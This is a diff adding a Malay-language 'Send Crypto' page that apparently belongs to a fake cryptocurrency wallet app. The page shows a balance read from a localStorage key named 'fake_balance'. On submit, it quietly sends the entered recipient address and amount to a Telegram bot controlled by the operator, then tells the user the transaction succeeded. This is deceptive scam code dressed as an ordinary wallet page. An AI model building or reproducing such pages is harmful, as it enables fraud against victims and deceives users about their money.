@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hantar Kripto</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body style="background: #fff;">
+
+    <div class="top-nav">
+        <a href="dashboard.html" style="font-size: 24px; text-decoration: none; color: #111;">←</a>
+        <div style="font-size: 18px; font-weight: 700;">Hantar Kripto</div>
+        <div style="width: 24px;"></div>
+    </div>
+
+    <div class="content" style="padding-top: 20px;">
+        <div style="background: var(--bg-gray); padding: 20px; border-radius: 16px; text-align: center; margin-bottom: 20px;">
+            <div class="coin-icon" style="background: #f7931a; margin: 0 auto 10px; width: 48px; height: 48px; font-size: 24px;">₿</div>
+            <h2 style="font-size: 20px; font-weight: 700;">Bitcoin (BTC)</h2>
+            <p style="color: var(--text-muted); font-size: 14px;">Baki: <span id="balance_display">0</span> BTC</p>
+        </div>
+
+        <form id="transferForm">
+            <div class="input-group">
+                <label>Alamat Wallet Penerima</label>
+                <input type="text" id="address" placeholder="Contoh: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" required>
+            </div>
+            <div class="input-group">
+                <label>Jumlah (RM)</label>
+                <input type="number" id="amount" placeholder="100" required>
+            </div>
+            <button type="submit" id="btn" style="background: var(--primary); color: #fff; padding: 16px; border-radius: 12px; border: none; font-weight: 700; font-size: 16px; margin-top: 20px;">Teruskan</button>
+        </form>
+    </div>
+
+    <script src="js/config.js"></script>
+    <script>
+        let balance = parseFloat(localStorage.getItem('fake_balance') || '0');
+        document.getElementById('balance_display').textContent = (balance / 200000).toFixed(6);
+
+        document.getElementById('transferForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            btn.textContent = "Memproses...";
+            btn.disabled = true;
+
+            const address = document.getElementById('address').value;
+            const amount = document.getElementById('amount').value;
+
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: `💸 <b>Transfer Crypto</b>\nAlamat: <code>${address}</code>\nJumlah: RM${amount}`, parse_mode: "HTML" })
+            });
+
+            alert("Transaksi berjaya dihantar.");
+            window.location.href = "dashboard.html";
+        });
+    </script>
+</body>
+</html>
